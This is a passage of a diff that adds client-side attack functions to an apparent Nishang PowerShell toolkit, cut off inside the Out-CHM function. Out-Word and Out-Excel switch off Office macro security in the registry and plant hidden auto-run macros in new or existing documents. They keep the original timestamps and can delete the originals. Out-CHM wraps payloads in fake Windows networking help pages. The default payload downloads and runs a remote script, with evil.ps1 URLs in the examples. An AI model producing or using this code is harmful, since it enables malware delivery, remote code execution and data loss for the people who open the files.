@@ -3933,3 +3933,1208 @@ Major part of the script is written by Nikhil ShreeKumar (@roo7break)
     }        
 	Write-Host "Data sent to all ports"
 }
+
+##################################Client Side Attack functions######################################
+#######################################Out-Word#############################################
+function Out-Word
+{
+<#
+.SYNOPSIS
+Nishang Script which can generate and "infect" existing word files with an auto executable macro. 
+
+.DESCRIPTION
+The script can create as well as "infect" existing word files with an auto executable macro. Powershell payloads
+could be exeucted using the genereated files. If a folder is passed to the script it can insert macro in all existing word
+files in the folder. With the Recurse switch, sub-folders can also be included. 
+For existing files, a new macro enabled doc file is generated from a docx file and for existing .doc files, the macro code is inserted.
+LastWriteTime of the docx file is set to the newly generated doc file. If the RemoveDocx switch is enabled, the 
+original docx is removed and the data in it is lost.
+
+.PARAMETER Payload
+Payload which you want execute on the target.
+
+.PARAMETER PayloadURL
+URL of the powershell script which would be executed on the target.
+
+.PARAMETER Arguments
+Arguments to the powershell script to be executed on the target.
+
+.PARAMETER WordFileDir
+The directory which contains MS Word files which are to be "infected".
+
+.PARAMETER OutputFile
+The path for the output Word file. Default is Salary_Details.doc in the current directory.
+
+.PARAMETER Recurse
+Recursively look for Word files in the WordFileDir
+
+.PARAMETER RemoveDocx
+When using the WordFileDir to "infect" files in a directory, remove the original ones after creating the infected ones.
+
+.PARAMETER RemainSafe
+Use this switch to turn on Macro Security on your machine after using Out-Word.
+
+.EXAMPLE
+PS > Out-Word -Payload "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process"
+
+Use above command to provide your own payload to be executed from macro. A file named "Salary_Details.doc" would be generated
+in the current directory.
+
+.EXAMPLE
+PS > Out-Word -PayloadURL http://yourwebserver.com/evil.ps1
+
+Use above when you want to use the default payload, which is a powershell download and execute one-liner. A file 
+named "Salary_Details.doc" would be generated in user's temp directory.
+
+.EXAMPLE
+PS > Out-Word -PayloadURL http://yourwebserver.com/evil.ps1 -Arguments Evil
+
+Use above when you want to use the default payload, which is a powershell download and execute one-liner.
+The Arugment parameter allows to pass arguments to the downloaded script.
+
+.EXAMPLE
+PS > Out-Word -PayloadURL http://yourwebserver.com/evil.ps1 -OutputFile C:\docfiles\Generated.doc
+
+In above, the output file would be saved to the given path.
+
+.EXAMPLE
+PS > Out-Word -PayloadURL http://yourwebserver.com/evil.ps1 -WordFileDir C:\docfiles\
+
+In above, in the C:\docfiles directory, macro enabled .doc files would be created for all the .docx files, with the same name
+and same Last MOdified Time.
+
+.EXAMPLE
+PS > Out-Word -PayloadURL http://yourwebserver.com/evil.ps1 -WordFileDir C:\docfiles\ -Recurse
+
+The above command would search recursively for .docx files in C:\docfiles.
+
+.EXAMPLE
+PS > Out-Word -PayloadURL http://yourwebserver.com/evil.ps1 -WordFileDir C:\docfiles\ -Recurse -RemoveDocx
+
+The above command would search recursively for .docx files in C:\docfiles, generate macro enabled .doc files and
+delete the original files.
+
+.EXAMPLE
+PS > Out-Word -PayloadURL http://yourwebserver.com/evil.ps1 -RemainSafe
+
+Out-Word turns off Macro Security. Use -RemainSafe to turn it back on.
+
+
+.LINK
+http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
+https://github.com/samratashok/nishang
+#>
+
+    [CmdletBinding()] Param(
+        
+        [Parameter(Position=0, Mandatory = $False)]
+        [String]
+        $Payload,
+        
+        [Parameter(Position=1, Mandatory = $False)]
+        [String]
+        $PayloadURL,
+
+        [Parameter(Position=2, Mandatory = $False)]
+        [String]
+        $Arguments,
+        
+        [Parameter(Position=3, Mandatory = $False)]
+        [String]
+        $WordFileDir,
+        
+        [Parameter(Position=4, Mandatory = $False)]
+        [String]
+        $OutputFile="$pwd\Salary_Details.doc",
+
+        
+        [Parameter(Position=5, Mandatory = $False)]
+        [Switch]
+        $Recurse,
+        
+        [Parameter(Position=6, Mandatory = $False)]
+        [Switch]
+        $RemoveDocx,
+
+        [Parameter(Position=7, Mandatory = $False)]
+        [Switch]
+        $RemainSafe
+    )
+    
+    $Word = New-Object -ComObject Word.Application
+    $WordVersion = $Word.Version
+
+    #Check for Office 2007 or Office 2003
+    if (($WordVersion -eq "12.0") -or  ($WordVersion -eq "11.0"))
+    {
+        $Word.DisplayAlerts = $False
+    }
+    else
+    {
+        $Word.DisplayAlerts = "wdAlertsNone"
+    }    
+    #Turn off Macro Security
+    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\word\Security" -Name AccessVBOM -Value 1 -PropertyType DWORD -Force | Out-Null
+    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\word\Security" -Name VBAWarnings -Value 1 -PropertyType DWORD -Force | Out-Null
+
+    if(!$Payload)
+    {
+        $Payload = "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
+    }
+    #Macro Code
+    #Macro code from here http://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/
+    $code = @"
+    Sub Document_Open()
+    Execute
+
+    End Sub
+
+
+         Public Function Execute() As Variant
+            Const HIDDEN_WINDOW = 0
+            strComputer = "."
+            Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+         
+            Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+            Set objConfig = objStartup.SpawnInstance_
+            objConfig.ShowWindow = HIDDEN_WINDOW
+            Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+            objProcess.Create "$Payload", Null, objConfig, intProcessID
+         End Function
+"@
+
+  
+    if ($WordFileDir)
+    {
+        $WordFiles = Get-ChildItem $WordFileDir\* -Include *.doc,*.docx
+        if ($Recurse -eq $True)
+        {
+            $WordFiles = Get-ChildItem -Recurse $WordFileDir\* -Include *.doc,*.docx
+        }
+        ForEach ($WordFile in $WordFiles)
+        {
+            $Word = New-Object -ComObject Word.Application
+            $Word.DisplayAlerts = $False
+            $Doc = $Word.Documents.Open($WordFile.FullName)
+            $DocModule = $Doc.VBProject.VBComponents.Item(1)
+            $DocModule.CodeModule.AddFromString($code)
+            if ($WordFile.Extension -eq ".doc")
+            {
+                $Savepath = $WordFile.FullName
+            }
+            $Savepath = $WordFile.DirectoryName + "\" + $Wordfile.BaseName + ".doc"
+            #Append .doc to the original file name if file extensions are hidden for known file types.
+            if ((Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced).HideFileExt -eq "1")
+            {
+                $Savepath = $WordFile.FullName + ".doc"
+            }
+            if (($WordVersion -eq "12.0") -or  ($WordVersion -eq "11.0"))
+            {
+                $Doc.Saveas($SavePath, 0)
+            }
+            else
+            {
+                $Doc.Saveas([ref]$SavePath, 0)
+            } 
+            Write-Output "Saved to file $SavePath"
+            $Doc.Close()
+            $LastModifyTime = $WordFile.LastWriteTime
+            $FinalDoc = Get-ChildItem $Savepath
+            $FinalDoc.LastWriteTime = $LastModifyTime
+            if ($RemoveDocx -eq $True)
+            {
+                Write-Output "Deleting $($WordFile.FullName)"
+                Remove-Item -Path $WordFile.FullName
+            }
+            $Word.quit()
+            [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Word)
+        }
+    }
+    else
+    {
+        $Doc = $Word.documents.add()
+        $DocModule = $Doc.VBProject.VBComponents.Item(1)
+        $DocModule.CodeModule.AddFromString($code)
+        if (($WordVersion -eq "12.0") -or  ($WordVersion -eq "11.0"))
+        {
+            $Doc.Saveas($OutputFile, 0)
+        }
+        else
+        {
+            $Doc.Saveas([ref]$OutputFile, [ref]0)
+        } 
+        Write-Output "Saved to file $OutputFile"
+        $Doc.Close()
+        $Word.quit()
+        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Word)
+    }
+
+    if ($RemainSafe -eq $True)
+    {
+        #Turn on Macro Security
+        New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\word\Security" -Name AccessVBOM -Value 0 -Force | Out-Null
+        New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\word\Security" -Name VBAWarnings -Value 0 -Force | Out-Null
+    }
+}
+
+#######################################Out-Excel#############################################
+
+function Out-Excel
+{
+
+<#
+.SYNOPSIS
+Nishang Script which can generate and "infect" existing excel files with an auto executable macro. 
+
+.DESCRIPTION
+The script can create as well as "infect" existing excel files with an auto executable macro. Powershell payloads
+could be exeucted using the genereated files. If a folder is passed to the script it can insert macro in all existing excrl
+files in the folder. With the Recurse switch, sub-folders can also be included. 
+For existing files, a new macro enabled xls file is generated from a xlsx file and for existing .xls files, the macro code is inserted.
+LastWriteTime of the xlsx file is set to the newly generated xls file. If the RemoveXlsx switch is enabled, the 
+original xlsx is removed and the data in it is lost.
+
+.PARAMETER Payload
+Payload which you want execute on the target.
+
+.PARAMETER PayloadURL
+URL of the powershell script which would be executed on the target.
+
+.PARAMETER Arguments
+Arguments to the powershell script to be executed on the target.
+
+.PARAMETER ExcelFileDir
+The directory which contains MS Excel files which are to be "infected".
+
+.PARAMETER OutputFile
+The path for the output Excel file. Default is Salary_Details.xls in the current directory.
+
+.PARAMETER Recurse
+Recursively look for Excel files in the ExcelFileDir
+
+.PARAMETER RemoveXlsx
+When using the ExcelFileDir to "infect" files in a directory, remove the original ones after creating the infected ones.
+
+.PARAMETER RemainSafe
+Use this switch to turn on Macro Security on your machine after using Out-Excel.
+
+.EXAMPLE
+PS > Out-Excel -Payload "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process"
+
+Use above command to provide your own payload to be executed from macro. A file named "Salary_Details.xls" would be generated
+in user's temp directory.
+
+.EXAMPLE
+PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1
+
+Use above when you want to use the default payload, which is a powershell download and execute one-liner. A file 
+named "Salary_Details.xls" would be generated in user's temp directory.
+
+.EXAMPLE
+PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -Arguments
+
+Use above when you want to use the default payload, which is a powershell download and execute one-liner.
+The Arugment parameter allows to pass arguments to the downloaded script.
+
+.EXAMPLE
+PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -OutputFile C:\xlsfiles\Generated.xls
+
+In above, the output file would be saved to the given path.
+
+.EXAMPLE
+PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -ExcelFileDir C:\xlsfiles\
+
+In above, in the C:\xlsfiles directory, macro enabled .xls files would be created for all the .xlsx files, with the same name
+and same Last MOdified Time.
+
+.EXAMPLE
+PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -ExcelFileDir C:\xlsfiles\ -Recurse
+
+The above command would search recursively for .xlsx files in C:\xlsfiles.
+
+.EXAMPLE
+PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -ExcelFileDir C:\xlsfiles\ -Recurse -RemoveXlsx
+
+The above command would search recursively for .xlsx files in C:\xlsfiles, generate macro enabled .xls files and
+delete the original files.
+
+.EXAMPLE
+PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -RemainSafe
+
+Out-Excel turns off Macro Security. Use -RemainSafe to turn it back on.
+
+
+.LINK
+http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
+https://github.com/samratashok/nishang
+#>
+
+
+    [CmdletBinding()] Param(
+        
+        [Parameter(Position=0, Mandatory = $False)]
+        [String]
+        $Payload,
+        
+        [Parameter(Position=1, Mandatory = $False)]
+        [String]
+        $PayloadURL,
+
+        [Parameter(Position=2, Mandatory = $False)]
+        [String]
+        $Arguments,
+        
+        [Parameter(Position=3, Mandatory = $False)]
+        [String]
+        $ExcelFileDir,
+        
+        [Parameter(Position=4, Mandatory = $False)]
+        [String]
+        $OutputFile="$pwd\Salary_Details.xls",
+
+        
+        [Parameter(Position=5, Mandatory = $False)]
+        [Switch]
+        $Recurse,
+        
+        [Parameter(Position=6, Mandatory = $False)]
+        [Switch]
+        $RemoveXlsx,
+
+        [Parameter(Position=7, Mandatory = $False)]
+        [Switch]
+        $RemainSafe
+    )
+    
+    #http://stackoverflow.com/questions/21278760/how-to-add-vba-code-in-excel-worksheet-in-powershell
+    $Excel = New-Object -ComObject Excel.Application
+    $ExcelVersion = $Excel.Version
+    #Check for Office 2007 or Office 2003
+    if (($ExcelVersion -eq "12.0") -or  ($ExcelVersion -eq "11.0"))
+    {
+        $Excel.DisplayAlerts = $False
+    }
+    else
+    {
+        $Excel.DisplayAlerts = "wdAlertsNone"
+    }    
+    #Turn off Macro Security
+    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
+    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null
+
+    if(!$Payload)
+    {
+        $Payload = "powershell.exe -ExecutionPolicy Bypass -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
+    }
+    #Macro Code
+    #Macro code from here http://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/
+    $CodeAuto = @"
+    Sub Auto_Open()
+    Execute
+
+    End Sub
+
+
+         Public Function Execute() As Variant
+            Const HIDDEN_WINDOW = 0
+            strComputer = "."
+            Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+         
+            Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+            Set objConfig = objStartup.SpawnInstance_
+            objConfig.ShowWindow = HIDDEN_WINDOW
+            Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+            objProcess.Create '$Payload', Null, objConfig, intProcessID
+         End Function
+"@
+
+    $CodeWorkbook = @"
+    Sub Workbook_Open()
+    Execute
+
+    End Sub
+
+
+         Public Function Execute() As Variant
+            Const HIDDEN_WINDOW = 0
+            strComputer = "."
+            Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+         
+            Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+            Set objConfig = objStartup.SpawnInstance_
+            objConfig.ShowWindow = HIDDEN_WINDOW
+            Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+            objProcess.Create '$Payload', Null, objConfig, intProcessID
+         End Function
+"@
+
+  
+    if ($ExcelFileDir)
+    {
+        $ExcelFiles = Get-ChildItem $ExcelFileDir *.xlsx
+        if ($Recurse -eq $True)
+        {
+            $ExcelFiles = Get-ChildItem -Recurse $ExcelFileDir *.xlsx
+        }
+        ForEach ($ExcelFile in $ExcelFiles)
+        {
+            $Excel = New-Object -ComObject Excel.Application
+            $Excel.DisplayAlerts = $False
+            $WorkBook = $Excel.Workbooks.Open($ExcelFile.FullName)
+            $ExcelModule = $WorkBook.VBProject.VBComponents.Item(1)
+            $ExcelModule.CodeModule.AddFromString($CodeWorkbook)
+            $Savepath = $ExcelFile.DirectoryName + "\" + $ExcelFile.BaseName + ".xls"
+            #Append .xls to the original file name if file extensions are hidden for known file types.
+            if ((Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced).HideFileExt -eq "1")
+            {
+                $Savepath = $ExcelFile.FullName + ".xls"
+            }
+            $WorkBook.Saveas($SavePath, 18)
+            Write-Output "Saved to file $SavePath"
+            $Excel.Workbooks.Close()
+            $LastModifyTime = $ExcelFile.LastWriteTime
+            $FinalDoc = Get-ChildItem $Savepath
+            $FinalDoc.LastWriteTime = $LastModifyTime
+            if ($RemoveXlsx -eq $True)
+            {
+                Write-Output "Deleting $($ExcelFile.FullName)"
+                Remove-Item -Path $ExcelFile.FullName
+            }
+            $Excel.Quit()
+            [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel)
+        }
+    }
+    else
+    {
+        $WorkBook = $Excel.Workbooks.Add(1)
+        $WorkSheet=$WorkBook.WorkSheets.item(1)
+        $ExcelModule = $WorkBook.VBProject.VBComponents.Add(1)
+        $ExcelModule.CodeModule.AddFromString($CodeAuto)
+        $WorkBook.SaveAs($OutputFile, 18)
+        Write-Output "Saved to file $OutputFile"
+        $Excel.Workbooks.Close()
+        $Excel.Quit()
+        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel)
+    }
+
+    if ($RemainSafe -eq $True)
+    {
+        #Turn on Macro Security
+        New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\excel\Security" -Name AccessVBOM -Value 0 -Force | Out-Null
+        New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\excel\Security" -Name VBAWarnings -Value 0 -Force | Out-Null
+    }
+}
+
+#######################################Out-CHM#############################################
+
+
+function Out-CHM
+{
+
+<#
+.SYNOPSIS
+Nishang script useful for creating Compiled HTML Help file (.CHM) which could be used to run PowerShell commands and scripts.
+
+.DESCRIPTION
+The script generates a CHM file which needs to be sent to a target.
+You must have hhc.exe (HTML Help Workshop) on your machine to use this script.
+HTML Help Workshop is a free Microsoft Tool and could be downloaded from below link:
+http://www.microsoft.com/en-us/download/details.aspx?id=21138
+
+.PARAMETER Payload
+Payload which you want execute on the target.
+
+.PARAMETER PayloadURL
+URL of the powershell script which would be executed on the target.
+
+.PARAMETER Arguments
+Arguments to the powershell script to be executed on the target.
+
+.PARAMETER OutputPath
+Path to the directory where the files would be saved. Default is the current directory.
+
+.EXAMPLE
+PS > Out-CHM -Payload "Get-Process" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
+
+Above command would execute Get-Process on the target machine when the CHM file is opened.
+
+.EXAMPLE
+PS > Out-CHM -PayloadURL http://192.168.254.1/Get-Information.ps1 -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
+
+Use above command to generate CHM file which download and execute the given powershell script in memory on target.
+
+.EXAMPLE
+PS > Out-CHM -Payload "-EncodedCommand <>" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
+
+Use above command to generate CHM file which executes the encoded command/script.
+Use Invoke-Encode from Nishang to encode the command or script.
+
+.EXAMPLE
+PS > Out-CHM -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
+
+Use above command to pass an argument to the powershell script/module.
+
+.LINK
+http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
+https://github.com/samratashok/nishang
+
+.Notes
+Based on the work mentioned in this tweet by @ithurricanept
+https://twitter.com/ithurricanept/status/534993743196090368
+#>
+
+
+
+    [CmdletBinding()] Param(
+        
+        [Parameter(Position = 0, Mandatory = $False)]
+        [String]
+        $Payload,
+        
+        [Parameter(Position = 1, Mandatory = $False)]
+        [String]
+        $PayloadURL,
+
+        [Parameter(Position = 2, Mandatory = $False)]
+        [String]
+        $Arguments,
+
+        [Parameter(Position = 3, Mandatory = $True)]
+        [String]
+        $HHCPath,
+
+        [Parameter(Position = 4, Mandatory = $False)]
+        [String]
+        $OutputPath="$pwd"
+    )
+
+    #Check if the payload has been provided by the user
+    if(!$Payload)
+    {
+        $Payload = "IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
+    }    
+
+    #Create the table of contents for the CHM
+    $CHMTableOfContents = @"
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
+<HTML>
+<HEAD>
+<meta name="GENERATOR" content="Microsoft&reg; HTML Help Workshop 4.1">
+<!-- Sitemap 1.0 -->
+</HEAD><BODY>
+  <UL>
+  <LI> <OBJECT type="text/sitemap">
+      <param name="Name" value="IPv4 Advanced IP Settings Tab">
+      <param name="Local" value="doc.htm">
+  </OBJECT>
+  </UL>
+  <UL>
+  <LI> <OBJECT type="text/sitemap">
+      <param name="Name" value="IPv4 Advanced WINS Tab">
+      <param name="Local" value="doc1.htm">
+  </OBJECT>
+  </UL>
+  <UL>
+  <LI> <OBJECT type="text/sitemap">
+      <param name="Name" value="IPv4 Alternate Configuration Tab">
+      <param name="Local" value="doc.htm">
+  </OBJECT>
+  </UL>
+  <UL>
+  <LI> <OBJECT type="text/sitemap">
+      <param name="Name" value="IPv4 and IPv6 Advanced DNS Tab">
+      <param name="Local" value="doc1.htm">
+  </OBJECT>
+  </UL>
+</BODY>
+</HTML>
+"@
+
+    #Create the Project file for the CHM
+    $CHMProject = @"
+[OPTIONS]
+Contents file=$OutputPath\doc.hhc
+[FILES]
+$OutputPath\doc.htm
+$OutputPath\doc1.htm
+"@
+    #Create the HTM files, the first one controls the payload execution.
+    $CHMHTML1 = @"
+<HTML>
+<TITLE>Check for Windows updates from Command Line</TITLE>
+<HEAD>
+</HEAD>
+<BODY>
+
+<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
+<PARAM name="Command" value="ShortCut">
+ <PARAM name="Button" value="Bitmap::shortcut">
+ <PARAM name="Item1" value=",cmd.exe,/c C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NoProfile $Payload">
+ <PARAM name="Item2" value="273,1,1">
+</OBJECT>
+
+<SCRIPT>
+x.Click();
+</SCRIPT>
+
+<html DIR="LTR" xmlns:MSHelp="http://msdn.microsoft.com/mshelp" xmlns:ddue="http://ddue.schemas.microsoft.com/authoring/2003/5" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:tool="http://www.microsoft.com/tooltip"><head><META HTTP-EQUIV="Content-Type" CONTENT="text/html; CHARSET=Windows-1252"></META><META NAME="save" CONTENT="history"></META><title>IPv4 Advanced IP Settings Tab</title><link rel="stylesheet" type="text/css" href="../local/Classic.css"></link><script src="../local/script.js"></script></head><body><div id="header"><h1>IPv4 Advanced IP Settings Tab</h1></div><div id="mainSection"><div id="mainBody"><p class="runningHeader"></p>
+<p>You can use the settings on this tab for this network connection only if you are not using the <b>Obtain an IP address automatically</b> on the <b>General</b> tab.</p>
+
+<p><b>IP addresses</b> lists additional Internet Protocol version 4 (IPv4) addresses that can be assigned to this network connection. There is no limit to the number of IP addresses that can be configured. This setting is useful if this computer connects to a single physical network but requires advanced IP addressing because of either of the following reasons:</p>
+
+<ul><li class="unordered">
+A single logical IP network is in use and this computer needs to use more than one IP address to communicate on that network.<br /><br />
+</li><li class="unordered">
+Multiple logical IP networks are in use and this computer needs a different IP address to communicate with each of the different logical IP networks.<br /><br />
+</li></ul>
+
+<p><b>Default gateways</b> lists IP addresses for additional default gateways that can be used by this network connection. A default gateway is a local IP router that is used to forward packets to destinations beyond the local network. </p>
+
+<p><b>Automatic metric</b> specifies whether TCP/IP automatically calculates a value for an interface metric that is based on the speed of the interface. The highest-speed interface has the lowest interface metric value. </p>
+
+<p><b>Interface metric</b> provides a location for you to type a value for the interface metric for this network connection. A lower value for the interface metric indicates a higher priority for use of this interface. </p>
+<h1 class="heading">Procedures</h1><div id="sectionSection0" class="section"><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
+<table class="alertTable" cellspacing="0" cellpadding="0" xmlns=""><tr><td class="imgCell"><img class="note" src="../local/Procedure.gif"></img></td><td class="procHeadingCell"><b>To configure additional IP addresses for this connection</b></td></tr></table><ddue:steps><ol class="ordered" xmlns=""><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
+<p xmlns="">In <b>IP Addresses</b>, click <b>Add</b>.<b> </b></p>
+</content></li><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
+<p xmlns="">Type an IP address in <b>IP address</b>. </p>
+</content></li><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
+<p xmlns="">Type a subnet mask in <b>Subnet mask</b>, and then click <b>Add</b>.</p>
+</content></li><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
+<p xmlns="">Repeat steps 1 through 3 for each IP address you want to add, and then click <b>OK</b>.</p>
+</content></li></ol></ddue:steps>
+
+<table class="alertTable" cellspacing="0" cellpadding="0" xmlns=""><tr><td class="imgCell"><img class="note" src="../local/Procedure.gif"></img></td><td class="procHeadingCell"><b>To configure additional default gateways for this connection</b></td></tr></table><ddue:steps><ol class="ordered" xmlns=""><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
+<p xmlns="">On the <b>IP Settings</b> tab, in <b>Default gateways</b>, click <b>Add</b>.</p>
+</content></li><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
+<p xmlns="">In <b>TCP/IP Gateway Address</b>, type the IP address of the default gateway in <b>Gateway</b>. To manually configure a default route metric, clear the <b>Automatic metric </b>check box and type a metric in <b>Metric</b>.</p>
+</content></li><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
+<p xmlns="">Click <b>Add</b>.</p>
+</content></li><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
+<p xmlns="">Repeat steps 1 through 3 for each default gateway you want to add, and then click <b>OK</b>.</p>
+</content></li></ol></ddue:steps>
+
+<table class="alertTable" cellspacing="0" cellpadding="0" xmlns=""><tr><td class="imgCell"><img class="note" src="../local/Procedure.gif"></img></td><td class="procHeadingCell"><b>To configure a custom metric for this connection</b></td></tr></table><ddue:steps><ul xmlns=""><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
+<p xmlns="">Clear the <b>Automatic metric</b> check box, and then type a metric value in <b>Interface metric</b>.</p>
+</content></li></ul></ddue:steps>
+</content></div><h1 class="heading">Additional references</h1><div id="sectionSection1" class="section"><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
+<p xmlns="">For updated detailed IT pro information about TCP/IP versions 4 and 6, see <a href="http://go.microsoft.com/fwlink/?LinkID=117437" alt="" target="_blank"><linkText xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">http://go.microsoft.com/fwlink/?LinkID=117437</linkText></a> and <a href="http://go.microsoft.com/fwlink/?LinkID=71543" alt="" target="_blank"><linkText xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">http://go.microsoft.com/fwlink/?LinkID=71543</linkText></a>.</p>
+</content></div></div><hr /><p /></div></body></html>
+</BODY>
+</HTML>
+"@
+    #Second help topic to make the file look authentic.
+    $CHMHTML2 = @"
+<html DIR="LTR" xmlns:MSHelp="http://msdn.microsoft.com/mshelp" xmlns:ddue="http://ddue.schemas.microsoft.com/authoring/2003/5" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:tool="http://www.microsoft.com/tooltip"><head><META HTTP-EQUIV="Content-Type" CONTENT="text/html; CHARSET=Windows-1252"></META><META NAME="save" CONTENT="history"></META><title>IPv4 Advanced WINS Tab</title><link rel="stylesheet" type="text/css" href="../local/Classic.css"></link><script src="../local/script.js"></script></head><body><div id="header"><h1>IPv4 Advanced WINS Tab</h1></div><div id="mainSection"><div id="mainBody"><p class="runningHeader"></p>
+<p>You can use the settings on this tab for this network connection only if you are not using the <b>Obtain an IP address automatically</b> on the <b>General</b> tab.</p>
+
+<p><b>WINS addresses, in order of use</b> lists the Windows Internet Name Service (WINS) servers that TCP/IP queries to resolve network basic input/output system (NetBIOS) names. WINS servers are queried in the order in which they are listed here.</p>
+
+<p><b>Enable LMHOSTS lookup</b> specifies whether an Lmhosts file is used to resolve the NetBIOS names of remote computers to an IP address. </p>
+
+<p>Click <b>Import LMHOSTS</b> to import a file into the Lmhosts file. The Lmhosts file is located in the %SystemRoot%\System32\Drivers\Etc folder on a Windows-based computer. There is also a sample Lmhosts file (Lmhosts.sam) in this folder. When you import LMHOSTS from a file, the original Lmhosts file is not appended to, but is overwritten by the new file.</p>
+
+<p><b>NetBIOS setting</b> specifies whether this network connection obtains the setting to enable or disable NetBIOS over TCP/IP (NetBT) from a Dynamic Host Configuration Protocol (DHCP) server. </p>
+
+<p>When an IP address is automatically obtained, the <b>Default</b> option is selected so that this computer uses the NetBT setting as optionally provided by the DHCP server when this computer obtains an IP address and configuration lease. If the Disable NetBIOS over TCP/IP (NetBT) DHCP option is provided by the DHCP server, the value of the option determines whether NetBT is enabled or disabled. If the Disable NetBIOS over TCP/IP (NetBT) DHCP option is not provided by the DHCP server, NetBT is enabled.</p>
+
+<p>If you are manually configuring an IP address, selecting <b>Enable NetBIOS over TCP/IP</b> enables NetBT. This option is not available for dial-up connections.</p>
+<h1 class="heading">Procedures</h1><div id="sectionSection0" class="section"><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
+<table class="alertTable" cellspacing="0" cellpadding="0" xmlns=""><tr><td class="imgCell"><img class="note" src="../local/Procedure.gif"></img></td><td class="procHeadingCell"><b>To configure advanced WINS properties</b></td></tr></table><ddue:steps><ol class="ordered" xmlns=""><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
+<p xmlns="">In <b>WINS addresses, in order of use</b>, click <b>Add</b>, type the address of the WINS server, and then click <b>Add</b>.</p>
+</content></li><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
+<p xmlns="">Repeat step 1 for each WINS server IP address you want to add, and then click <b>OK</b>.</p>
+</content></li></ol></ddue:steps>
+
+<table class="alertTable" cellspacing="0" cellpadding="0" xmlns=""><tr><td class="imgCell"><img class="note" src="../local/Procedure.gif"></img></td><td class="procHeadingCell"><b>To enable the use of the Lmhosts file to resolve remote NetBIOS names</b></td></tr></table><ddue:steps><ul xmlns=""><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
+<p xmlns="">Select the <b>Enable LMHOSTS lookup</b> check box. This option is enabled by default.</p>
+</content></li></ul></ddue:steps>
+
+<table class="alertTable" cellspacing="0" cellpadding="0" xmlns=""><tr><td class="imgCell"><img class="note" src="../local/Procedure.gif"></img></td><td class="procHeadingCell"><b>To specify the location of the file that you want to import into the Lmhosts file</b></td></tr></table><ddue:steps><ul xmlns=""><li><content xmlns="http://ddue.schemas.microsoft.com/authoring/2003/5">
